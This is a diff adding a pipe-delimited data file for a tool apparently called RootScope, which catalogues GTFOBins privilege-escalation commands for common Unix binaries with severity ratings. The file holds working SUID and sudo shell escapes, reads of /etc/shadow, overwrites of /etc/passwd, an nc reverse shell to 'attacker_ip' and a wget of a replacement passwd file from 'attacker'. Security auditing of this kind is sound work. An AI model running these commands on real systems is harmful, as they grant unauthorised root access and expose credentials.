@@ -1,0 +1,88 @@
+# ============================================================================
+# RootScope — intelligence/gtfobins.db
+# GTFOBins exploitation mapping database.
+# Format: binary|technique|command|severity
+#
+# Techniques: suid, sudo, capabilities, file-read, file-write, shell, limited-suid
+# Severity: CRITICAL, HIGH, MEDIUM
+# ============================================================================
+# Lines starting with # are comments.
+# ============================================================================
+awk|suid|awk 'BEGIN {system("/bin/sh")}'|CRITICAL
+awk|sudo|sudo awk 'BEGIN {system("/bin/sh")}'|CRITICAL
+base64|file-read|base64 /etc/shadow \| base64 -d|HIGH
+bash|suid|bash -p|CRITICAL
+bash|sudo|sudo bash|CRITICAL
+busybox|suid|busybox sh|CRITICAL
+cat|file-read|cat /etc/shadow|HIGH
+chmod|suid|chmod 4755 /bin/bash|CRITICAL
+cp|suid|cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash|CRITICAL
+curl|file-read|curl file:///etc/shadow|HIGH
+cut|file-read|cut -d "" -f1 /etc/shadow|MEDIUM
+dash|suid|dash -p|CRITICAL
+dd|file-write|echo "data" \| dd of=/etc/passwd|CRITICAL
+diff|file-read|diff --line-format=%L /dev/null /etc/shadow|HIGH
+dmesg|file-read|dmesg|MEDIUM
+docker|shell|docker run -v /:/mnt --rm -it alpine chroot /mnt sh|CRITICAL
+ed|shell|ed then !/bin/sh|HIGH
+emacs|shell|emacs -Q -nw --eval '(term "/bin/sh")'|HIGH
+env|suid|env /bin/sh -p|CRITICAL
+expect|shell|expect -c 'spawn /bin/sh;interact'|HIGH
+find|suid|find . -exec /bin/sh -p \\; -quit|CRITICAL
+find|sudo|sudo find . -exec /bin/sh \\; -quit|CRITICAL
+flock|suid|flock -u / /bin/sh -p|CRITICAL
+ftp|shell|ftp then !/bin/sh|HIGH
+gdb|suid|gdb -nx -ex 'python import os; os.execl("/bin/sh","sh","-p")' -ex quit|CRITICAL
+git|sudo|sudo git -p help config then !/bin/sh|HIGH
+grep|file-read|grep -r '' /etc/shadow|HIGH
+ionice|suid|ionice /bin/sh -p|CRITICAL
+ip|sudo|sudo ip netns add foo then sudo ip netns exec foo /bin/sh|CRITICAL
+jq|file-read|jq . /etc/shadow|HIGH
+less|shell|less /etc/passwd then !/bin/sh|HIGH
+ltrace|suid|ltrace -b -L /bin/sh -p|HIGH
+lua|suid|lua -e 'os.execute("/bin/sh")'|CRITICAL
+man|sudo|sudo man man then !/bin/sh|HIGH
+more|shell|more /etc/passwd then !/bin/sh|HIGH
+mount|sudo|sudo mount -o bind /bin/sh /bin/mount|CRITICAL
+mysql|shell|mysql -e '\\! /bin/sh'|HIGH
+nano|sudo|sudo nano (Ctrl+R, Ctrl+X, command)|HIGH
+nawk|suid|nawk 'BEGIN {system("/bin/sh")}'|CRITICAL
+nc|shell|nc -e /bin/sh attacker_ip port|CRITICAL
+nice|suid|nice /bin/sh -p|CRITICAL
+nmap|sudo|sudo nmap --interactive then !sh|CRITICAL
+node|suid|node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'|CRITICAL
+openssl|file-read|openssl enc -in /etc/shadow|HIGH
+perl|suid|perl -e 'exec "/bin/sh"'|CRITICAL
+perl|sudo|sudo perl -e 'exec "/bin/sh"'|CRITICAL
+php|suid|php -r "pcntl_exec('/bin/sh', ['-p']);"|CRITICAL
+php|sudo|sudo php -r "system('/bin/sh');"|CRITICAL
+pip|sudo|TF=$(mktemp -d) && echo 'import os;os.execl("/bin/sh","sh")' > $TF/setup.py && sudo pip install $TF|CRITICAL
+python|suid|python -c 'import os; os.execl("/bin/sh","sh","-p")'|CRITICAL
+python|sudo|sudo python -c 'import os; os.system("/bin/sh")'|CRITICAL
+python3|suid|python3 -c 'import os; os.execl("/bin/sh","sh","-p")'|CRITICAL
+python3|sudo|sudo python3 -c 'import os; os.system("/bin/sh")'|CRITICAL
+rlwrap|suid|rlwrap /bin/sh -p|CRITICAL
+rsync|suid|rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null|CRITICAL
+ruby|suid|ruby -e 'exec "/bin/sh -p"'|CRITICAL
+ruby|sudo|sudo ruby -e 'exec "/bin/sh"'|CRITICAL
+run-parts|suid|run-parts --new-session --regex '^sh$' /bin --arg '-p'|CRITICAL
+scp|file-read|scp -S /bin/sh x y:|HIGH
+sed|file-read|sed '' /etc/shadow|HIGH
+socat|shell|socat stdin exec:/bin/sh|CRITICAL
+sqlite3|shell|sqlite3 /dev/null '.shell /bin/sh'|HIGH
+ssh|shell|ssh -o ProxyCommand=';sh 0<&2 1>&2' x|CRITICAL
+strace|suid|strace -o /dev/null /bin/sh -p|CRITICAL
+tar|suid|tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh|CRITICAL
+taskset|suid|taskset 1 /bin/sh -p|CRITICAL
+tee|file-write|echo "data" \| tee /etc/passwd|HIGH
+time|suid|time /bin/sh -p|CRITICAL
+tmux|shell|tmux|HIGH
+vi|sudo|sudo vi then :!sh|CRITICAL
+vim|sudo|sudo vim -c ':!sh'|CRITICAL
+watch|suid|watch -x /bin/sh -p -c 'reset; exec sh -p 1>&0 2>&0'|CRITICAL
+wget|file-write|wget http://attacker/passwd -O /etc/passwd|CRITICAL
+wish|suid|wish then exec /bin/sh -p <@stdin >@stdout 2>@stderr|CRITICAL
+xargs|suid|xargs -a /dev/null sh -p|CRITICAL
+xxd|file-read|xxd /etc/shadow \| xxd -r|HIGH
+zip|suid|zip /tmp/z /etc/hosts -T -TT 'sh -p #'|CRITICAL
+zsh|suid|zsh|CRITICAL
